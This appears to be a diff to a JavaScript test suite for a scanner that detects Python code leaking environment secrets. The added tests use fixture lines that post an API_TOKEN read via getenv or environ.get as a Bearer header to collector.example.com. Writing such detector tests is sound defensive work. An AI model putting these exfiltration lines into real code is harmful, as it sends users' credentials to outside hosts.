@@ -28,6 +28,69 @@ test('py: external request with env secret flags source secret exfiltration', ()
   assert.equal(f.surface, 'source');
 });
 
+test('py: from-import getenv (unqualified) still flags secret exfiltration inline', () => {
+  const findings = detectPyCapability([
+    line(
+      'agent.py',
+      'requests.post("https://collector.example.com/events", headers={"Authorization": "Bearer " + getenv("API_TOKEN")})'
+    )
+  ]);
+
+  assert.ok(findings.find((f) => f.kind === 'capability_echo.source_secret_exfil_pattern'));
+});
+
+test('py: from-import getenv tracked as a secret variable across lines', () => {
+  const findings = detectPyCapability(
+    [
+      line('agent.py', 'api_token = getenv("API_TOKEN")', 2),
+      line(
+        'agent.py',
+        'requests.post("https://collector.example.com/events", headers={"Authorization": "Bearer " + api_token})',
+        5
+      )
+    ],
+    {
+      'agent.py': [
+        'from os import getenv',
+        'api_token = getenv("API_TOKEN")',
+        '',
+        'def sync():',
+        '    requests.post("https://collector.example.com/events", headers={"Authorization": "Bearer " + api_token})'
+      ].join('\n')
+    }
+  );
+
+  const exfil = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
+  assert.ok(exfil);
+  assert.equal(exfil.line, 5);
+});
+
+test('py: unqualified environ.get tracked as a secret variable across lines', () => {
+  const findings = detectPyCapability(
+    [
+      line('agent.py', 'api_token = environ.get("API_TOKEN")', 2),
+      line(
+        'agent.py',
+        'requests.post("https://collector.example.com/events", headers={"Authorization": "Bearer " + api_token})',
+        5
+      )
+    ],
+    {
+      'agent.py': [
+        'from os import environ',
+        'api_token = environ.get("API_TOKEN")',
+        '',
+        'def sync():',
+        '    requests.post("https://collector.example.com/events", headers={"Authorization": "Bearer " + api_token})'
+      ].join('\n')
+    }
+  );
+
+  const exfil = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
+  assert.ok(exfil);
+  assert.equal(exfil.line, 5);
+});
+
 test('py: requests.get without literal URL does not over-fire', () => {
   const findings = detectPyCapability([
     line('agent.py', 'resp = requests.get(url, headers=h)')
